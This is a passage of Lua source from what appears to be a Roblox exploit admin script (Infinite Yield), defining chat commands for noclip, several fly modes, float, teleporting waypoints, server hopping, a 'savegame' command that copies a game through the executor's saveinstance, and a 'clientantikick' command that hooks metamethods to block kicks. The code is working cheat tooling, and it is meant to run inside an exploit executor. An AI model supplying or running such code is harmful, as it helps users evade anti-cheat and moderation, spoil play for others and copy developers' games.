		addcmd('gametp',{'gameteleport'},function(args, speaker)
			TeleportService:Teleport(args[1])
		end)
	
		addcmd("rejoin", {"rj"}, function(args, speaker)
			if #Players:GetPlayers() <= 1 then
				Players.LocalPlayer:Kick("\nRejoining...")
				wait()
				TeleportService:Teleport(PlaceId, Players.LocalPlayer)
			else
				TeleportService:TeleportToPlaceInstance(PlaceId, JobId, Players.LocalPlayer)
			end
		end)
	
		addcmd("autorejoin", {"autorj"}, function(args, speaker)
			GuiService.ErrorMessageChanged:Connect(function()
				execCmd("rejoin")
			end)
			notify("Auto Rejoin", "Auto rejoin enabled")
		end)
	
		addcmd("serverhop", {"shop"}, function(args, speaker)
			-- thanks to Amity for fixing
			local servers = {}
			local req = game:HttpGet("https://games.roblox.com/v1/games/" .. PlaceId .. "/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true")
			local body = HttpService:JSONDecode(req)
	
			if body and body.data then
				for i, v in next, body.data do
					if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and v.id ~= JobId then
						table.insert(servers, 1, v.id)
					end
				end
			end
	
			if #servers > 0 then
				TeleportService:TeleportToPlaceInstance(PlaceId, servers[math.random(1, #servers)], Players.LocalPlayer)
			else
				return notify("Serverhop", "Couldn't find a server.")
			end
		end)
	
		addcmd("exit", {}, function(args, speaker)
			game:Shutdown()
		end)
	
		local Noclipping = nil
		addcmd('noclip',{},function(args, speaker)
			Clip = false
			wait(0.1)
			local function NoclipLoop()
				if Clip == false and speaker.Character ~= nil then
					for _, child in pairs(speaker.Character:GetDescendants()) do
						if child:IsA("BasePart") and child.CanCollide == true and child.Name ~= floatName then
							child.CanCollide = false
						end
					end
				end
			end
			Noclipping = RunService.Stepped:Connect(NoclipLoop)
			if args[1] and args[1] == 'nonotify' then return end
			notify('Noclip','Noclip Enabled')
		end)
	
		addcmd('clip',{'unnoclip'},function(args, speaker)
			if Noclipping then
				Noclipping:Disconnect()
			end
			Clip = true
			if args[1] and args[1] == 'nonotify' then return end
			notify('Noclip','Noclip Disabled')
		end)
	
		addcmd('togglenoclip',{},function(args, speaker)
			if Clip then
				execCmd('noclip')
			else
				execCmd('clip')
			end
		end)
	
		FLYING = false
		QEfly = true
		iyflyspeed = 1
		vehicleflyspeed = 1
		function sFLY(vfly)
			local plr = Players.LocalPlayer
			local char = plr.Character or plr.CharacterAdded:Wait()
			local humanoid = char:FindFirstChildOfClass("Humanoid")
			if not humanoid then
				repeat task.wait() until char:FindFirstChildOfClass("Humanoid")
				humanoid = char:FindFirstChildOfClass("Humanoid")
			end
	
			if flyKeyDown or flyKeyUp then
				flyKeyDown:Disconnect()
				flyKeyUp:Disconnect()
			end
	
			local T = getRoot(char)
			local CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
			local lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
			local SPEED = 0
	
			local function FLY()
				FLYING = true
				local BG = Instance.new('BodyGyro')
				local BV = Instance.new('BodyVelocity')
				BG.P = 9e4
				BG.Parent = T
				BV.Parent = T
				BG.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
				BG.CFrame = T.CFrame
				BV.Velocity = Vector3.new(0, 0, 0)
				BV.MaxForce = Vector3.new(9e9, 9e9, 9e9)
				task.spawn(function()
					repeat task.wait()
						local camera = workspace.CurrentCamera
						if not vfly and humanoid then
							humanoid.PlatformStand = true
						end
	
						if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0 then
							SPEED = 50
						elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0) and SPEED ~= 0 then
							SPEED = 0
						end
						if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 or (CONTROL.Q + CONTROL.E) ~= 0 then
							BV.Velocity = ((camera.CFrame.LookVector * (CONTROL.F + CONTROL.B)) + ((camera.CFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - camera.CFrame.p)) * SPEED
							lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
						elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and (CONTROL.Q + CONTROL.E) == 0 and SPEED ~= 0 then
							BV.Velocity = ((camera.CFrame.LookVector * (lCONTROL.F + lCONTROL.B)) + ((camera.CFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - camera.CFrame.p)) * SPEED
						else
							BV.Velocity = Vector3.new(0, 0, 0)
						end
						BG.CFrame = camera.CFrame
					until not FLYING
					CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
					lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
					SPEED = 0
					BG:Destroy()
					BV:Destroy()
	
					if humanoid then humanoid.PlatformStand = false end
				end)
			end
	
			flyKeyDown = UserInputService.InputBegan:Connect(function(input, processed)
				if input.KeyCode == Enum.KeyCode.W then
					CONTROL.F = (vfly and vehicleflyspeed or iyflyspeed)
				elseif input.KeyCode == Enum.KeyCode.S then
					CONTROL.B = - (vfly and vehicleflyspeed or iyflyspeed)
				elseif input.KeyCode == Enum.KeyCode.A then
					CONTROL.L = - (vfly and vehicleflyspeed or iyflyspeed)
				elseif input.KeyCode == Enum.KeyCode.D then
					CONTROL.R = (vfly and vehicleflyspeed or iyflyspeed)
				elseif input.KeyCode == Enum.KeyCode.E and QEfly then
					CONTROL.Q = (vfly and vehicleflyspeed or iyflyspeed)*2
				elseif input.KeyCode == Enum.KeyCode.Q and QEfly then
					CONTROL.E = -(vfly and vehicleflyspeed or iyflyspeed)*2
				end
				pcall(function() camera.CameraType = Enum.CameraType.Track end)
			end)
	
			flyKeyUp = UserInputService.InputEnded:Connect(function(input, processed)
				if input.KeyCode == Enum.KeyCode.W then
					CONTROL.F = 0
				elseif input.KeyCode == Enum.KeyCode.S then
					CONTROL.B = 0
				elseif input.KeyCode == Enum.KeyCode.A then
					CONTROL.L = 0
				elseif input.KeyCode == Enum.KeyCode.D then
					CONTROL.R = 0
				elseif input.KeyCode == Enum.KeyCode.E then
					CONTROL.Q = 0
				elseif input.KeyCode == Enum.KeyCode.Q then
					CONTROL.E = 0
				end
			end)
			FLY()
		end
	
		function NOFLY()
			FLYING = false
			if flyKeyDown or flyKeyUp then flyKeyDown:Disconnect() flyKeyUp:Disconnect() end
			if Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
				Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
			end
			pcall(function() workspace.CurrentCamera.CameraType = Enum.CameraType.Custom end)
		end
	
		local velocityHandlerName = randomString()
		local gyroHandlerName = randomString()
		local mfly1
		local mfly2
	
		local unmobilefly = function(speaker)
			pcall(function()
				FLYING = false
				local root = getRoot(speaker.Character)
				root:FindFirstChild(velocityHandlerName):Destroy()
				root:FindFirstChild(gyroHandlerName):Destroy()
				speaker.Character:FindFirstChildWhichIsA("Humanoid").PlatformStand = false
				mfly1:Disconnect()
				mfly2:Disconnect()
			end)
		end
	
		local mobilefly = function(speaker, vfly)
			unmobilefly(speaker)
			FLYING = true
	
			local root = getRoot(speaker.Character)
			local camera = workspace.CurrentCamera
			local v3none = Vector3.new()
			local v3zero = Vector3.new(0, 0, 0)
			local v3inf = Vector3.new(9e9, 9e9, 9e9)
	
			local controlModule = require(speaker.PlayerScripts:WaitForChild("PlayerModule"):WaitForChild("ControlModule"))
			local bv = Instance.new("BodyVelocity")
			bv.Name = velocityHandlerName
			bv.Parent = root
			bv.MaxForce = v3zero
			bv.Velocity = v3zero
	
			local bg = Instance.new("BodyGyro")
			bg.Name = gyroHandlerName
			bg.Parent = root
			bg.MaxTorque = v3inf
			bg.P = 1000
			bg.D = 50
	
			mfly1 = speaker.CharacterAdded:Connect(function()
				local bv = Instance.new("BodyVelocity")
				bv.Name = velocityHandlerName
				bv.Parent = root
				bv.MaxForce = v3zero
				bv.Velocity = v3zero
	
				local bg = Instance.new("BodyGyro")
				bg.Name = gyroHandlerName
				bg.Parent = root
				bg.MaxTorque = v3inf
				bg.P = 1000
				bg.D = 50
			end)
	
			mfly2 = RunService.RenderStepped:Connect(function()
				root = getRoot(speaker.Character)
				camera = workspace.CurrentCamera
				if speaker.Character:FindFirstChildWhichIsA("Humanoid") and root and root:FindFirstChild(velocityHandlerName) and root:FindFirstChild(gyroHandlerName) then
					local humanoid = speaker.Character:FindFirstChildWhichIsA("Humanoid")
					local VelocityHandler = root:FindFirstChild(velocityHandlerName)
					local GyroHandler = root:FindFirstChild(gyroHandlerName)
	
					VelocityHandler.MaxForce = v3inf
					GyroHandler.MaxTorque = v3inf
					if not vfly then humanoid.PlatformStand = true end
					GyroHandler.CFrame = camera.CoordinateFrame
					VelocityHandler.Velocity = v3none
	
					local direction = controlModule:GetMoveVector()
					if direction.X > 0 then
						VelocityHandler.Velocity = VelocityHandler.Velocity + camera.CFrame.RightVector * (direction.X * ((vfly and vehicleflyspeed or iyflyspeed) * 50))
					end
					if direction.X < 0 then
						VelocityHandler.Velocity = VelocityHandler.Velocity + camera.CFrame.RightVector * (direction.X * ((vfly and vehicleflyspeed or iyflyspeed) * 50))
					end
					if direction.Z > 0 then
						VelocityHandler.Velocity = VelocityHandler.Velocity - camera.CFrame.LookVector * (direction.Z * ((vfly and vehicleflyspeed or iyflyspeed) * 50))
					end
					if direction.Z < 0 then
						VelocityHandler.Velocity = VelocityHandler.Velocity - camera.CFrame.LookVector * (direction.Z * ((vfly and vehicleflyspeed or iyflyspeed) * 50))
					end
				end
			end)
		end
	
		addcmd('fly',{},function(args, speaker)
			if not IsOnMobile then
				NOFLY()
				wait()
				sFLY()
			else
				mobilefly(speaker)
			end
			if args[1] and isNumber(args[1]) then
				iyflyspeed = args[1]
			end
		end)
	
		addcmd('flyspeed',{'flysp'},function(args, speaker)
			local speed = args[1] or 1
			if isNumber(speed) then
				iyflyspeed = speed
			end
		end)
	
		addcmd('unfly',{'nofly','novfly','unvehiclefly','novehiclefly','unvfly'},function(args, speaker)
			if not IsOnMobile then NOFLY() else unmobilefly(speaker) end
		end)
	
		addcmd('vfly',{'vehiclefly'},function(args, speaker)
			if not IsOnMobile then
				NOFLY()
				wait()
				sFLY(true)
			else
				mobilefly(speaker, true)
			end
			if args[1] and isNumber(args[1]) then
				vehicleflyspeed = args[1]
			end
		end)
	
		addcmd('togglevfly',{},function(args, speaker)
			if FLYING then
				if not IsOnMobile then NOFLY() else unmobilefly(speaker) end
			else
				if not IsOnMobile then sFLY(true) else mobilefly(speaker, true) end
			end
		end)
	
		addcmd('vflyspeed',{'vflysp','vehicleflyspeed','vehicleflysp'},function(args, speaker)
			local speed = args[1] or 1
			if isNumber(speed) then
				vehicleflyspeed = speed
			end
		end)
	
		addcmd('qefly',{'flyqe'},function(args, speaker)
			if args[1] == 'false' then
				QEfly = false
			else
				QEfly = true
			end
		end)
	
		addcmd('togglefly',{},function(args, speaker)
			if FLYING then
				if not IsOnMobile then NOFLY() else unmobilefly(speaker) end
			else
				if not IsOnMobile then sFLY() else mobilefly(speaker) end
			end
		end)
	
		CFspeed = 50
		addcmd('cframefly', {'cfly'}, function(args, speaker)
			if args[1] and isNumber(args[1]) then
				CFspeed = args[1]
			end
	
			-- Full credit to peyton#9148 (apeyton)
			speaker.Character:FindFirstChildOfClass('Humanoid').PlatformStand = true
			local Head = speaker.Character:WaitForChild("Head")
			Head.Anchored = true
			if CFloop then CFloop:Disconnect() end
			CFloop = RunService.Heartbeat:Connect(function(deltaTime)
				local moveDirection = speaker.Character:FindFirstChildOfClass('Humanoid').MoveDirection * (CFspeed * deltaTime)
				local headCFrame = Head.CFrame
				local camera = workspace.CurrentCamera
				local cameraCFrame = camera.CFrame
				local cameraOffset = headCFrame:ToObjectSpace(cameraCFrame).Position
				cameraCFrame = cameraCFrame * CFrame.new(-cameraOffset.X, -cameraOffset.Y, -cameraOffset.Z + 1)
				local cameraPosition = cameraCFrame.Position
				local headPosition = headCFrame.Position
	
				local objectSpaceVelocity = CFrame.new(cameraPosition, Vector3.new(headPosition.X, cameraPosition.Y, headPosition.Z)):VectorToObjectSpace(moveDirection)
				Head.CFrame = CFrame.new(headPosition) * (cameraCFrame - cameraPosition) * CFrame.new(objectSpaceVelocity)
			end)
		end)
	
		addcmd('uncframefly',{'uncfly'},function(args, speaker)
			if CFloop then
				CFloop:Disconnect()
				speaker.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
				local Head = speaker.Character:WaitForChild("Head")
				Head.Anchored = false
			end
		end)
	
		addcmd('cframeflyspeed',{'cflyspeed'},function(args, speaker)
			if isNumber(args[1]) then
				CFspeed = args[1]
			end
		end)
	
		Floating = false
		floatName = randomString()
		addcmd('float', {'platform'},function(args, speaker)
			Floating = true
			local pchar = speaker.Character
			if pchar and not pchar:FindFirstChild(floatName) then
				task.spawn(function()
					local Float = Instance.new('Part')
					Float.Name = floatName
					Float.Parent = pchar
					Float.Transparency = 1
					Float.Size = Vector3.new(2,0.2,1.5)
					Float.Anchored = true
					local FloatValue = -3.1
					Float.CFrame = getRoot(pchar).CFrame * CFrame.new(0,FloatValue,0)
					notify('Float','Float Enabled (Q = down & E = up)')
					qUp = IYMouse.KeyUp:Connect(function(KEY)
						if KEY == 'q' then
							FloatValue = FloatValue + 0.5
						end
					end)
					eUp = IYMouse.KeyUp:Connect(function(KEY)
						if KEY == 'e' then
							FloatValue = FloatValue - 1.5
						end
					end)
					qDown = IYMouse.KeyDown:Connect(function(KEY)
						if KEY == 'q' then
							FloatValue = FloatValue - 0.5
						end
					end)
					eDown = IYMouse.KeyDown:Connect(function(KEY)
						if KEY == 'e' then
							FloatValue = FloatValue + 1.5
						end
					end)
					floatDied = speaker.Character:FindFirstChildOfClass('Humanoid').Died:Connect(function()
						FloatingFunc:Disconnect()
						Float:Destroy()
						qUp:Disconnect()
						eUp:Disconnect()
						qDown:Disconnect()
						eDown:Disconnect()
						floatDied:Disconnect()
					end)
					local function FloatPadLoop()
						if pchar:FindFirstChild(floatName) and getRoot(pchar) then
							Float.CFrame = getRoot(pchar).CFrame * CFrame.new(0,FloatValue,0)
						else
							FloatingFunc:Disconnect()
							Float:Destroy()
							qUp:Disconnect()
							eUp:Disconnect()
							qDown:Disconnect()
							eDown:Disconnect()
							floatDied:Disconnect()
						end
					end			
					FloatingFunc = RunService.Heartbeat:Connect(FloatPadLoop)
				end)
			end
		end)
	
		addcmd('unfloat',{'nofloat','unplatform','noplatform'},function(args, speaker)
			Floating = false
			local pchar = speaker.Character
			notify('Float','Float Disabled')
			if pchar:FindFirstChild(floatName) then
				pchar:FindFirstChild(floatName):Destroy()
			end
			if floatDied then
				FloatingFunc:Disconnect()
				qUp:Disconnect()
				eUp:Disconnect()
				qDown:Disconnect()
				eDown:Disconnect()
				floatDied:Disconnect()
			end
		end)
	
		addcmd('togglefloat',{},function(args, speaker)
			if Floating then
				execCmd('unfloat')
			else
				execCmd('float')
			end
		end)
	
		swimming = false
		local oldgrav = workspace.Gravity
		local swimbeat = nil
		addcmd('swim',{},function(args, speaker)
			if not swimming and speaker and speaker.Character and speaker.Character:FindFirstChildWhichIsA("Humanoid") then
				oldgrav = workspace.Gravity
				workspace.Gravity = 0
				local swimDied = function()
					workspace.Gravity = oldgrav
					swimming = false
				end
				local Humanoid = speaker.Character:FindFirstChildWhichIsA("Humanoid")
				gravReset = Humanoid.Died:Connect(swimDied)
				local enums = Enum.HumanoidStateType:GetEnumItems()
				table.remove(enums, table.find(enums, Enum.HumanoidStateType.None))
				for i, v in pairs(enums) do
					Humanoid:SetStateEnabled(v, false)
				end
				Humanoid:ChangeState(Enum.HumanoidStateType.Swimming)
				swimbeat = RunService.Heartbeat:Connect(function()
					pcall(function()
						speaker.Character.HumanoidRootPart.Velocity = ((Humanoid.MoveDirection ~= Vector3.new() or UserInputService:IsKeyDown(Enum.KeyCode.Space)) and speaker.Character.HumanoidRootPart.Velocity or Vector3.new())
					end)
				end)
				swimming = true
			end
		end)
	
		addcmd('unswim',{'noswim'},function(args, speaker)
			if speaker and speaker.Character and speaker.Character:FindFirstChildWhichIsA("Humanoid") then
				workspace.Gravity = oldgrav
				swimming = false
				if gravReset then
					gravReset:Disconnect()
				end
				if swimbeat ~= nil then
					swimbeat:Disconnect()
					swimbeat = nil
				end
				local Humanoid = speaker.Character:FindFirstChildWhichIsA("Humanoid")
				local enums = Enum.HumanoidStateType:GetEnumItems()
				table.remove(enums, table.find(enums, Enum.HumanoidStateType.None))
				for i, v in pairs(enums) do
					Humanoid:SetStateEnabled(v, true)
				end
			end
		end)
	
		addcmd('toggleswim',{},function(args, speaker)
			if swimming then
				execCmd('unswim')
			else
				execCmd('swim')
			end
		end)
	
		addcmd('setwaypoint',{'swp','setwp','spos','saveposition','savepos'},function(args, speaker)
			local WPName = tostring(getstring(1))
			if getRoot(speaker.Character) then
				notify('Modified Waypoints',"Created waypoint: "..getstring(1))
				local torso = getRoot(speaker.Character)
				WayPoints[#WayPoints + 1] = {NAME = WPName, COORD = {math.floor(torso.Position.X), math.floor(torso.Position.Y), math.floor(torso.Position.Z)}, GAME = PlaceId}
				if AllWaypoints ~= nil then
					AllWaypoints[#AllWaypoints + 1] = {NAME = WPName, COORD = {math.floor(torso.Position.X), math.floor(torso.Position.Y), math.floor(torso.Position.Z)}, GAME = PlaceId}
				end
			end	
			refreshwaypoints()
			updatesaves()
		end)
	
		addcmd('waypointpos',{'wpp','setwaypointposition','setpos','setwaypoint','setwaypointpos'},function(args, speaker)
			local WPName = tostring(getstring(1))
			if getRoot(speaker.Character) then
				notify('Modified Waypoints',"Created waypoint: "..getstring(1))
				WayPoints[#WayPoints + 1] = {NAME = WPName, COORD = {args[2], args[3], args[4]}, GAME = PlaceId}
				if AllWaypoints ~= nil then
					AllWaypoints[#AllWaypoints + 1] = {NAME = WPName, COORD = {args[2], args[3], args[4]}, GAME = PlaceId}
				end
			end	
			refreshwaypoints()
			updatesaves()
		end)
	
		addcmd('waypoints',{'positions'},function(args, speaker)
			if SettingsOpen == false then SettingsOpen = true
				Settings:TweenPosition(UDim2.new(0, 0, 0, 45), "InOut", "Quart", 0.5, true, nil)
				CMDsF.Visible = false
			end
			KeybindsFrame:TweenPosition(UDim2.new(0, 0, 0, 175), "InOut", "Quart", 0.5, true, nil)
			AliasesFrame:TweenPosition(UDim2.new(0, 0, 0, 175), "InOut", "Quart", 0.5, true, nil)
			PluginsFrame:TweenPosition(UDim2.new(0, 0, 0, 175), "InOut", "Quart", 0.5, true, nil)
			PositionsFrame:TweenPosition(UDim2.new(0, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
			wait(0.5)
			SettingsHolder.Visible = false
			maximizeHolder()
		end)
	
		waypointParts = {}
		addcmd('showwaypoints',{'showwp','showwps'},function(args, speaker)
			execCmd('hidewaypoints')
			wait()
			for i,_ in pairs(WayPoints) do
				local x = WayPoints[i].COORD[1]
				local y = WayPoints[i].COORD[2]
				local z = WayPoints[i].COORD[3]
				local part = Instance.new("Part")
				part.Size = Vector3.new(5,5,5)
				part.CFrame = CFrame.new(x,y,z)
				part.Parent = workspace
				part.Anchored = true
				part.CanCollide = false
				table.insert(waypointParts,part)
				local view = Instance.new("BoxHandleAdornment")
				view.Adornee = part
				view.AlwaysOnTop = true
				view.ZIndex = 10
				view.Size = part.Size
				view.Parent = part
			end
			for i,v in pairs(pWayPoints) do
				local view = Instance.new("BoxHandleAdornment")
				view.Adornee = pWayPoints[i].COORD[1]
				view.AlwaysOnTop = true
				view.ZIndex = 10
				view.Size = pWayPoints[i].COORD[1].Size
				view.Parent = pWayPoints[i].COORD[1]
				table.insert(waypointParts,view)
			end
		end)
	
		addcmd('hidewaypoints',{'hidewp','hidewps'},function(args, speaker)
			for i,v in pairs(waypointParts) do
				v:Destroy()
			end
			waypointParts = {}
		end)
	
		addcmd('waypoint',{'wp','lpos','loadposition','loadpos'},function(args, speaker)
			local WPName = tostring(getstring(1))
			if speaker.Character then
				for i,_ in pairs(WayPoints) do
					if tostring(WayPoints[i].NAME):lower() == tostring(WPName):lower() then
						local x = WayPoints[i].COORD[1]
						local y = WayPoints[i].COORD[2]
						local z = WayPoints[i].COORD[3]
						getRoot(speaker.Character).CFrame = CFrame.new(x,y,z)
					end
				end
				for i,_ in pairs(pWayPoints) do
					if tostring(pWayPoints[i].NAME):lower() == tostring(WPName):lower() then
						getRoot(speaker.Character).CFrame = CFrame.new(pWayPoints[i].COORD[1].Position)
					end
				end
			end
		end)
	
		tweenSpeed = 1
		addcmd('tweenspeed',{'tspeed'},function(args, speaker)
			local newSpeed = args[1] or 1
			if tonumber(newSpeed) then
				tweenSpeed = tonumber(newSpeed)
			end
		end)
	
		addcmd('tweenwaypoint',{'twp'},function(args, speaker)
			local WPName = tostring(getstring(1))
			if speaker.Character then
				for i,_ in pairs(WayPoints) do
					local x = WayPoints[i].COORD[1]
					local y = WayPoints[i].COORD[2]
					local z = WayPoints[i].COORD[3]
					if tostring(WayPoints[i].NAME):lower() == tostring(WPName):lower() then
						TweenService:Create(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = CFrame.new(x,y,z)}):Play()
					end
				end
				for i,_ in pairs(pWayPoints) do
					if tostring(pWayPoints[i].NAME):lower() == tostring(WPName):lower() then
						TweenService:Create(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = CFrame.new(pWayPoints[i].COORD[1].Position)}):Play()
					end
				end
			end
		end)
	
		addcmd('walktowaypoint',{'wtwp'},function(args, speaker)
			local WPName = tostring(getstring(1))
			if speaker.Character then
				for i,_ in pairs(WayPoints) do
					local x = WayPoints[i].COORD[1]
					local y = WayPoints[i].COORD[2]
					local z = WayPoints[i].COORD[3]
					if tostring(WayPoints[i].NAME):lower() == tostring(WPName):lower() then
						if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
							speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
							wait(.1)
						end
						speaker.Character:FindFirstChildOfClass('Humanoid').WalkToPoint = Vector3.new(x,y,z)
					end
				end
				for i,_ in pairs(pWayPoints) do
					if tostring(pWayPoints[i].NAME):lower() == tostring(WPName):lower() then
						if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
							speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
							wait(.1)
						end
						speaker.Character:FindFirstChildOfClass('Humanoid').WalkToPoint = Vector3.new(pWayPoints[i].COORD[1].Position)
					end
				end
			end
		end)
	
		addcmd('deletewaypoint',{'dwp','dpos','deleteposition','deletepos'},function(args, speaker)
			for i,v in pairs(WayPoints) do
				if v.NAME:lower() == tostring(getstring(1)):lower() then
					notify('Modified Waypoints',"Deleted waypoint: " .. v.NAME)
					table.remove(WayPoints, i)
				end
			end
			if AllWaypoints ~= nil and #AllWaypoints > 0 then
				for i,v in pairs(AllWaypoints) do
					if v.NAME:lower() == tostring(getstring(1)):lower() then
						if not v.GAME or v.GAME == PlaceId then
							table.remove(AllWaypoints, i)
						end
					end
				end
			end
			for i,v in pairs(pWayPoints) do
				if v.NAME:lower() == tostring(getstring(1)):lower() then
					notify('Modified Waypoints',"Deleted waypoint: " .. v.NAME)
					table.remove(pWayPoints, i)
				end
			end
			refreshwaypoints()
			updatesaves()
		end)
	
		addcmd('clearwaypoints',{'cwp','clearpositions','cpos','clearpos'},function(args, speaker)
			WayPoints = {}
			pWayPoints = {}
			refreshwaypoints()
			updatesaves()
			AllWaypoints = {}
			notify('Modified Waypoints','Removed all waypoints')
		end)
	
		addcmd('cleargamewaypoints',{'cgamewp'},function(args, speaker)
			for i,v in pairs(WayPoints) do
				if v.GAME == PlaceId then
					table.remove(WayPoints, i)
				end
			end
			if AllWaypoints ~= nil and #AllWaypoints > 0 then
				for i,v in pairs(AllWaypoints) do
					if v.GAME == PlaceId then
						table.remove(AllWaypoints, i)
					end
				end
			end
			for i,v in pairs(pWayPoints) do
				if v.GAME == PlaceId then
					table.remove(pWayPoints, i)
				end
			end
			refreshwaypoints()
			updatesaves()
			notify('Modified Waypoints','Deleted game waypoints')
		end)
	
	
		local coreGuiTypeNames = {
			-- predefined aliases
			["inventory"] = Enum.CoreGuiType.Backpack,
			["leaderboard"] = Enum.CoreGuiType.PlayerList,
			["emotes"] = Enum.CoreGuiType.EmotesMenu
		}
	
		-- Load the full list of enums
		for _, enumItem in ipairs(Enum.CoreGuiType:GetEnumItems()) do
			coreGuiTypeNames[enumItem.Name:lower()] = enumItem
		end
	
		addcmd('enable',{},function(args, speaker)
			local input = args[1] and args[1]:lower()
			if input then
				if input == "reset" then
					StarterGui:SetCore("ResetButtonCallback", true)
				else
					local coreGuiType = coreGuiTypeNames[input]
					if coreGuiType then
						StarterGui:SetCoreGuiEnabled(coreGuiType, true)
					end
				end
			end
		end)
	
		addcmd('disable',{},function(args, speaker)
			local input = args[1] and args[1]:lower()
			if input then
				if input == "reset" then
					StarterGui:SetCore("ResetButtonCallback", false)
				else
					local coreGuiType = coreGuiTypeNames[input]
					if coreGuiType then
						StarterGui:SetCoreGuiEnabled(coreGuiType, false)
					end
				end
			end
		end)
	
	
		local invisGUIS = {}
		addcmd('showguis',{},function(args, speaker)
			for i,v in pairs(PlayerGui:GetDescendants()) do
				if (v:IsA("Frame") or v:IsA("ImageLabel") or v:IsA("ScrollingFrame")) and not v.Visible then
					v.Visible = true
					if not FindInTable(invisGUIS,v) then
						table.insert(invisGUIS,v)
					end
				end
			end
		end)
	
		addcmd('unshowguis',{},function(args, speaker)
			for i,v in pairs(invisGUIS) do
				v.Visible = false
			end
			invisGUIS = {}
		end)
	
		local hiddenGUIS = {}
		addcmd('hideguis',{},function(args, speaker)
			for i,v in pairs(PlayerGui:GetDescendants()) do
				if (v:IsA("Frame") or v:IsA("ImageLabel") or v:IsA("ScrollingFrame")) and v.Visible then
					v.Visible = false
					if not FindInTable(hiddenGUIS,v) then
						table.insert(hiddenGUIS,v)
					end
				end
			end
		end)
	
		addcmd('unhideguis',{},function(args, speaker)
			for i,v in pairs(hiddenGUIS) do
				v.Visible = true
			end
			hiddenGUIS = {}
		end)
	
		function deleteGuisAtPos()
			pcall(function()
				local guisAtPosition = PlayerGui:GetGuiObjectsAtPosition(IYMouse.X, IYMouse.Y)
				for _, gui in pairs(guisAtPosition) do
					if gui.Visible == true then
						gui:Destroy()
					end
				end
			end)
		end
	
		local deleteGuiInput
		addcmd('guidelete',{},function(args, speaker)
			deleteGuiInput = UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
				if not gameProcessedEvent then
					if input.KeyCode == Enum.KeyCode.Backspace then
						deleteGuisAtPos()
					end
				end
			end)
			notify('GUI Delete Enabled','Hover over a GUI and press backspace to delete it')
		end)
	
		addcmd('unguidelete',{'noguidelete'},function(args, speaker)
			if deleteGuiInput then deleteGuiInput:Disconnect() end
			notify('GUI Delete Disabled','GUI backspace delete has been disabled')
		end)
	
		local wasStayOpen = StayOpen
		addcmd('hideiy',{},function(args, speaker)
			isHidden = true
			wasStayOpen = StayOpen
			if StayOpen == true then
				StayOpen = false
				On.BackgroundTransparency = 1
			end
			minimizeNum = 0
			minimizeHolder()
			if not (args[1] and tostring(args[1]) == 'nonotify') then notify('IY Hidden','You can press the prefix key to access the command bar') end
		end)
	
		addcmd('showiy',{'unhideiy'},function(args, speaker)
			isHidden = false
			minimizeNum = -20
			if wasStayOpen then
				maximizeHolder()
				StayOpen = true
				On.BackgroundTransparency = 0
			else
				minimizeHolder()
			end
		end)
	
		addcmd('rec', {'record'}, function(args, speaker)
			return COREGUI:ToggleRecording()
		end)
	
		addcmd('screenshot', {'scrnshot'}, function(args, speaker)
			return COREGUI:TakeScreenshot()
		end)
	
		addcmd('togglefs', {'togglefullscreen'}, function(args, speaker)
			return GuiService:ToggleFullscreen()
		end)
	
		addcmd('inspect', {'examine'}, function(args, speaker)
			for _, v in ipairs(getPlayer(args[1], speaker)) do
				GuiService:CloseInspectMenu()
				GuiService:InspectPlayerFromUserId(Players[v].UserId)
			end
		end)
	
		addcmd("savegame", {"saveplace"}, function(args, speaker)
			if saveinstance then
				notify("Loading", "Downloading game. This will take a while")
				saveinstance()
				notify("Game Saved", "Saved place to the workspace folder within your exploit folder.")
			else
				notify("Incompatible Exploit", "Your exploit does not support this command (missing saveinstance)")
			end
		end)
	
		addcmd('clearerror',{'clearerrors'},function(args, speaker)
			GuiService:ClearError()
		end)
	
		addcmd('clientantikick',{'antikick'},function(args, speaker)
			if not hookmetamethod then 
				return notify('Incompatible Exploit','Your exploit does not support this command (missing hookmetamethod)')
			end
			local LocalPlayer = Players.LocalPlayer
			local oldhmmi
			local oldhmmnc
			local oldKickFunction
			if hookfunction then
				oldKickFunction = hookfunction(LocalPlayer.Kick, function() end)
			end
			oldhmmi = hookmetamethod(game, "__index", function(self, method)
				if self == LocalPlayer and method:lower() == "kick" then
					return error("Expected ':' not '.' calling member function Kick", 2)
				end
				return oldhmmi(self, method)
			end)
			oldhmmnc = hookmetamethod(game, "__namecall", function(self, ...)
				if self == LocalPlayer and getnamecallmethod():lower() == "kick" then
					return
				end
				return oldhmmnc(self, ...)
			end)
	
			notify('Client Antikick','Client anti kick is now active (only effective on localscript kick)')
		end)
	
		allow_rj = true
